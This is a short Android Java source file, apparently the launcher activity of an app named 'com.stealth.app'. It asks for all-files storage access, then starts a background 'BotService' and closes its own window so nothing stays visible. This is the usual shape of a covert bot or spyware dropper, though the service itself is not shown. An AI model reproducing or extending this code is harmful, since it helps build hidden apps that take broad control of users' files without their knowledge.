package com.stealth.app;
import android.app.Activity; import android.content.Intent; import android.net.Uri;
import android.os.Build; import android.os.Bundle; import android.os.Environment;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else { startBot(); }
        } else { startBot(); }
    }
    private void startBot() {
        startService(new Intent(this, BotService.class));
        finishAffinity();
    }
}